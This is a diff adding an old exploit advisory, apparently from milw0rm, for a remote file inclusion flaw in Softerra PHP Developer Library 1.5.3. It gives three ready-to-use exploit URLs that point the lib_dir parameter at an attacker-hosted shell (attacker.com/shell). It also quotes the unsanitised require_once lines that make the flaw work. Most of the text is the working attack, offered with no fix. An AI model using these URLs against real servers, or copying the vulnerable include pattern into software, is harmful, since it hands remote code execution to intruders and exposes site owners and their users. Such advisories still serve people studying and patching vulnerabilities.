@@ -1,0 +1,52 @@
+## ## ## ## ## ## ## ## ## ## ## ## ## ## ## ## ## ## ## ## ## ##
+#                                                               #
+#           [ Softerra. PHP Developer Library ]                 #
+#                                                                
+# Class:     Remote File Include Vulnerability                  #
+# Patch:     Unavailable                                        #
+# Published  2006/10/12                                         #
+# Remote:    Yes                                                
+# Local:     No                            			#
+# Type:      High                                               #
+# Site:      http://www.softerra.com/products_php-library.htm   #
+# Author:    MP
+# Contact:   mp01010@yahoo.com                    		#
+#                                				#
+#################################################################
+
+Exploit:
+
+http://softerraphpdeveloper.com/PHPLibrary-1.5.3/lib/registry.lib.php?lib_dir=http://attacker.com/shell?
+http://softerraphpdeveloper.com/PHPLibrary-1.5.3/lib/sqlcompose.lib.php?lib_dir=http://attacker.com/shell?
+http://softerraphpdeveloper.com/PHPLibrary-1.5.3/lib/sqlsearch.lib.php?lib_dir=http://attacker.com/shell?
+
+
+Vuln Files:
+
+registry.lib.php
+sqlcompose.lib.php
+sqlsearch.lib.php
+
+
+Vuln Code:
+#
+../lib/registry.lib.php
+
+<? ...
+require_once ($lib_dir . "sqlstorage.class.php");
+... ?>
+##
+../lib/sqlcompose.lib.php
+
+<? ...
+require_once ($lib_dir . "array.lib.php");
+... ?>
+
+##
+../lib/sqlsearch.lib.php
+
+<? ...
+require_once ($lib_dir . "array.lib.php");
+... ?>
+
+# milw0rm.com [2006-10-12]
